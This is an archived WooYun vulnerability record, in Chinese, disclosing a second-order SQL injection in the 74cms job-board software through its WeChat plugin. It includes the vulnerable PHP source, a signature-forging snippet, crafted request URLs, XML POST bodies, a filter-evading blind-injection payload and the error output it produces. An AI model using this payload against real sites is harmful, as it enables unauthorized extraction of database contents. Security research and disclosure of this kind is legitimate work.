{"id": 88659, "wybug_id": "wooyun-2016-0195271", "wybug_title": "74cms_20160329及前面版本存在xxe二次注入                                      ", "wybug_corp": "74cms.com", "wybug_author": "路人甲", "wybug_date": "2016-04-12 15:00", "wybug_open_date": "2016-07-14 17:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码审核", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-18：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-06-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-14：\t细节向公众公开  简要描述： 无条件限制，前台直接注射，花了大半天写文档和exp脚本 详细说明：  问题出在plus/weixin.php\n$lat = $data['Latitude'];                $lng = $data['Longitude'];                $jobstable=table('jobs_search_key');                $rows = 5;                $offset = 0;                // 获取周边职位                if(!empty($lng) && !empty($lat))                {                    $idresult = $this->query(\"SELECT id , ROUND(6378.138*2*ASIN(SQRT(POW(SIN((\".$lat.\"*PI()/180-map_y*PI()/180)/2),2)+COS(\".$lat.\"*PI()/180)*COS(map_y*PI()/180)*POW(SIN((\".$lng.\"*PI()/180-map_x*PI()/180)/2),2)))*1000) AS juli FROM {$jobstable}  WHERE map_x!='' AND map_y!='' ORDER BY juli ASC   LIMIT {$offset},{$rows}\");                    while($row = $this->fetch_array($idresult))                    {                        $id[]=$row['id'];                    }                }                if (!empty($id))                {                    $wheresql=\" WHERE id IN (\".implode(',',$id).\") \";                    $sql = \"SELECT *, ROUND(6378.138*2*ASIN(SQRT(POW(SIN((\".$lat.\"*PI()/180-map_y*PI()/180)/2),2)+COS(\".$lat.\"*PI()/180)*COS(map_y*PI()/180)*POW(SIN((\".$lng.\"*PI()/180-map_x*PI()/180)/2),2)))*1000) AS juli FROM \".table('jobs').$wheresql.\"  ORDER BY juli ASC , stick DESC , refreshtime DESC limit 3\";                    $jobs_list = $this->getall($sql);                }\n其中$lat和$lng是从$data变量获取的。然后$data变量又是从\nrequire_once(QISHI_ROOT_PATH . 'data/weixin/location/'.$object->FromUserName.'.php')\n文件中引进的。那这个文件怎么生成的呢。在receiveEvent函数中生成的。\n//接收事件消息    private function receiveEvent($object)    {        global $_CFG;        switch ($object->Event)        {            case \"subscribe\":                $this->content = \"欢迎关注\".$_CFG['site_name'].\"！1.绑定您的\".$_CFG['site_name'].\"帐号，求职招聘更加方便，并实时接收提醒通知。<a href='\".WAP_DOMAIN.\"binding.php?from=\".$object->FromUserName.\"'>点此立即绑定</a>2.您可以回复【j】或【n】获取紧急、最新招聘信息，或者回复职位、公司等关键词如【销售】获取相关职位信息。3.每日签到，免费获取积分！\";                break;            case \"LOCATION\":                  $map=(array)$object;                $cache_file_path =QISHI_ROOT_PATH . 'data/weixin/location/'.$object->FromUserName.'.php';                $content = \"<?php\\r\\n\";            $content .= \" return \\$data=\".var_export($map, true).\";\\r\\n\";\n这边没有过滤，就直接把数据写入到文件中。$object参数是从responseMsg函数中带入\n//响应消息    public function responseMsg()    {        if(!$this->checkSignature())        {            exit();        };        $this->timestamp  = $_GET['timestamp'];        $this->nonce = $_GET[\"nonce\"];        $this->msg_signature  = $_GET['msg_signature'];        $this->encrypt_type = (isset($_GET['encrypt_type']) && ($_GET['encrypt_type'] == 'aes')) ? \"aes\" : \"raw\";        $postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];        if (!empty($postStr)){            //解密            if ($this->encrypt_type == 'aes'){                $pc = new WXBizMsgCrypt(TOKEN, EncodingAESKey, APPID);                                $decryptMsg = \"\";  //解密后的明文                $errCode = $pc->DecryptMsg($this->msg_signature, $this->timestamp, $this->nonce, $postStr, $decryptMsg);                $postStr = $decryptMsg;            }            if($this->check_php_version(\"5.2.11\")){                libxml_disable_entity_loader(true);            }            $postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);            $rxType = trim($postObj->MsgType);                         //消息类型分离            switch ($rxType)            {                case \"event\":                    $result = $this->receiveEvent($postObj);                    break;\n可以看到$postObj直接获取post的数据没有过滤带到了receiveEvent中，然后receiveEvent函数把用户提交的post数据写入到文件中，然后clickNearbyJobs函数读取文件中的数据带入到数据库查询，最后造成注入。用户分两次提交数据，第一次先构造好数据把payload写入到文件中\n<?xml version=\"1.0\" encoding=\"utf8\"?><xml><To>test</To><FromUserName>wooyun</FromUserName><Event>LOCATION</Event><MsgType>event</MsgType><Latitude>666</Latitude><Longitude>写入payload数据</Longitude></xml>\n其中FromUserName要是注册用户，并且要和第二次提交的FromUserName一样这边有个验证Signature的步骤，不正确，会导致程序退出。\n//响应消息    public function responseMsg()    {        if(!$this->checkSignature())        {            exit();        };\n跟进checkSignature函数\nprivate function checkSignature()    {        $signature = $_GET[\"signature\"];        $timestamp = $_GET[\"timestamp\"];        $nonce = $_GET[\"nonce\"];                        $token = TOKEN;        $tmpArr = array($token, $timestamp, $nonce);        sort($tmpArr, SORT_STRING);        $tmpStr = implode( $tmpArr );        $tmpStr = sha1( $tmpStr );              if($tmpStr == $signature )        {            return true;        }        else        {            return false;        }    }\n这边变量都是可控的，就可以自己随便生成正确的一个就好。其中$token是不可控，但是默认为空。我以$timestamp=a生成代码如下$nonce=b生成代码如下\n<?php    // $signature = \"\";    $timestamp = \"a\";    $nonce = \"b\";                    $token = \"\";    $tmpArr = array($token, $timestamp, $nonce);    sort($tmpArr, SORT_STRING);    $tmpStr = implode( $tmpArr );    $tmpStr = sha1( $tmpStr );          echo \"\\$signature = \".$tmpStr;?>\n然后提交地址\nhttp://localhost/74cms_v3.7_20160329/plus/weixin.php?signature=da23614e02469a0d7c7bd1bdab5c9c474b1904dc&timestamp=a&nonce=b\n提交上面的xml的post数据就能成功提交第二次提交的数据是为了能让程序读取上面生成的文件数据带入到数据库执行,这边\n$this->check_weixin_open($object);\n有检查微信公众号开了没，默认是没开，不过无所谓，因为该函数最后返回了，并没有没有开微信号就让程序退出，所以对下面程序的执行没有影响，可以忽略不计。第二次数据提交地址依然是\nhttp://localhost/74cms_v3.7_20160329/plus/weixin.php?signature=da23614e02469a0d7c7bd1bdab5c9c474b1904dc&timestamp=a&nonce=b\n提交post数据\n<?xml version=\"1.0\" encoding=\"utf8\"?><xml><To>test</To><FromUserName>wooyun</FromUserName><Event>CLICK</Event><EventKey>nearby_jobs</EventKey><MsgType>event</MsgType></xml>\n这边要绑定个人帐号\n// 周边职位    private function clickNearbyJobs($object){        global $_CFG;        $usinfo = $this->get_user_info($object->FromUserName);        if(!empty($usinfo)){            if($usinfo['utype']!=2)            {                $this->content = \"本操作需要绑定个人帐号！\";            }\n但是只要在这个地址http://localhost/74cms_v3.7_20160329/m/binding.php，填上正确的注册用户密码即可\n\n这边绑定并不需要管理员权限等，但是你要绑定的用户要和你上面要提交的FromUserName的用户一致然后讲讲payload的构造，由于74cms查询的时候也会有过滤，过滤函数如下\n//sql 过滤    static function CheckSql($db_string,$querytype='select')    {        global $QS_pwdhash;        $clean = '';        $error='';        $old_pos = 0;        $pos = -1;        $log_file = QISHI_ROOT_PATH.'/data/'.md5($QS_pwdhash).'_safe.txt';        $userIP = getip();        $getUrl =request_url();        $time = date('Y-m-d H:i:s');        if($querytype=='select')        {            $notallow1 = \"[^0-9a-z@\\._-]{1,}(sleep|benchmark|load_file|outfile)[^0-9a-z@\\.-]{1,}\";            if(preg_match(\"/\".$notallow1.\"/i\", $db_string))            {                fputs(fopen($log_file,'a+'),\"$userIP||$time\\r\\n$getUrl\\r\\n$db_string\\r\\nSelectBreak\\r\\n===========\\r\\n\");                exit(\"您输入的内容不符合要求请正确输入！\");            }        }        //完整的SQL检查        while (TRUE)        {            $pos = strpos($db_string, '\\'', $pos + 1);            if ($pos === FALSE)            {                break;            }            $clean .= substr($db_string, $old_pos, $pos - $old_pos);            while (TRUE)            {                $pos1 = strpos($db_string, '\\'', $pos + 1);                $pos2 = strpos($db_string, '\\\\', $pos + 1);                if ($pos1 === FALSE)                {                    break;                }                elseif ($pos2 == FALSE || $pos2 > $pos1)                {                    $pos = $pos1;                    break;                }                $pos = $pos2 + 1;            }            $clean .= '$s$';            $old_pos = $pos + 1;        }        $clean .= substr($db_string, $old_pos);        $clean = trim(strtolower(preg_replace(array('~\\s+~s' ), array(' '), $clean)));        if (strpos($clean, '@') !== FALSE  OR strpos($clean,'char(')!== FALSE OR strpos($clean,'\"')!== FALSE         OR strpos($clean,'$s$$s$')!== FALSE)        {            $fail = TRUE;            if(preg_match(\"#^create table#i\",$clean)) $fail = FALSE;            $error=\"unusual character\";        }        elseif (strpos($clean, '/*') > 2 || strpos($clean, '--') !== FALSE || strpos($clean, '#') !== FALSE)        {            $fail = TRUE;            $error=\"comment detect\";        }        elseif (strpos($clean, 'sleep') !== FALSE && preg_match('~(^|[^a-z])sleep($|[^[a-z])~is', $clean) != 0)        {            $fail = TRUE;            $error=\"slown down detect\";        }        elseif (strpos($clean, 'benchmark') !== FALSE && preg_match('~(^|[^a-z])benchmark($|[^[a-z])~is', $clean) != 0)        {            $fail = TRUE;            $error=\"slown down detect\";        }        elseif (strpos($clean, 'load_file') !== FALSE && preg_match('~(^|[^a-z])load_file($|[^[a-z])~is', $clean) != 0)        {            $fail = TRUE;            $error=\"file fun detect\";        }        elseif (strpos($clean, 'into outfile') !== FALSE && preg_match('~(^|[^a-z])into\\s+outfile($|[^[a-z])~is', $clean) != 0)        {            $fail = TRUE;            $error=\"file fun detect\";        }        if (!empty($fail))        {            fputs(fopen($log_file,'a+'),\"$userIP||$time\\r\\n$getUrl\\r\\n$db_string\\r\\n$error\\r\\n===========\\r\\n\");            exit(\"您输入的内容不符合要求请正确输入！\");        }        else        {            return $db_string;        }\n过滤了注释符，还有sleep盲注使用的一些函数。由于变量是在中间，不是在结尾，不能有注释符，有没有回显，参考了 http://**.**.**.**/bugs/wooyun-2010-0150114 绕过waf，构造的payload如下\n'1*PI()/180-map_y*PI()/180)/2),2)+COS(1*PI()/180)*COS(map_y*PI()/180)*POW(SIN((1*PI()/180-map_x*PI()/180)/2),2)))*1000) AS juli FROM qs_jobs_search_key where id=IF(ord(mid(user(),1,1)) = 114,1,1E308*2) union select 1,ROUND(ASIN(SQRT(POW(SIN((1'\n如果IF(ord(mid(user(),1,1)) = 114,1,1E308*2)条件正确，就会进入到这边\nif (!empty($id))                {                    $wheresql=\" WHERE id IN (\".implode(',',$id).\") \";                    $sql = \"SELECT *, ROUND(6378.138*2*ASIN(SQRT(POW(SIN((\".$lat.\"*PI()/180-map_y*PI()/180)/2),2)+COS(\".$lat.\"*PI()/180)*COS(map_y*PI()/180)*POW(SIN((\".$lng.\"*PI()/180-map_x*PI()/180)/2),2)))*1000) AS juli FROM \".table('jobs').$wheresql.\"  ORDER BY juli ASC , stick DESC , refreshtime DESC limit 3\";                    $jobs_list = $this->getall($sql);                }\n这边查询是错误的，列会不匹配，但是没事，报错结果是不一样的，这边报错是\nError：Query error:SELECT *, ROUND(6378.138*2*ASIN(SQRT(POW(SIN((111*PI()/180-map_y*PI()/180)/2),2)+COS(111*PI()/180)*COS(map_y*PI()/180)*POW(SIN((1*PI()/180-map_y*PI()/180)/2),2)+COS(1*PI()/180)*COS(map_y*PI()/180)*POW(SIN((1*PI()/180-map_x*PI()/180)/2),2)))*1000) AS juli FROM qs_jobs_search_key where id=IF(ord(mid(user(),1,1)) = 114,1,1E308*2) union select 1,ROUND(ASIN(SQRT(POW(SIN((1*PI()/180-map_x*PI()/180)/2),2)))*1000) AS juli FROM qs_jobs WHERE id IN (1) ORDER BY juli ASC , stick DESC , refreshtime DESC limit 3\n如果IF(ord(mid(user(),1,1)) = 114,1,1E308*2)条件错误，1E308*2超出范围，直接报错了，不会进入到下面执行了，这边的报错信息是\nError：Query error:SELECT id , ROUND(6378.138*2*ASIN(SQRT(POW(SIN((111*PI()/180-map_y*PI()/180)/2),2)+COS(111*PI()/180)*COS(map_y*PI()/180)*POW(SIN((1*PI()/180-map_y*PI()/180)/2),2)+COS(1*PI()/180)*COS(map_y*PI()/180)*POW(SIN((1*PI()/180-map_x*PI()/180)/2),2)))*1000) AS juli FROM qs_jobs_search_key where id=IF(ord(mid(user(),1,1)) = 112,1,1E308*2) union select 1,ROUND(ASIN(SQRT(POW(SIN((1*PI()/180-map_x*PI()/180)/2),2)))*1000) AS juli FROM qs_jobs_search_key WHERE map_x!='' AND map_y!='' ORDER BY juli ASC LIMIT 0,5\n那我们就可以直接根据报错信息的不同获取数据了   漏洞证明：  提交错误数据\n\n报错信息\n\n提交正确数据\n\n报错信息数据\n\n写个脚本跑跑试试\n\n   修复方案：  最新版0401已经修复了用户升级到最新版就好   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-04-15 17:15 厂商回复： CNVD未直接复现所述情况，暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}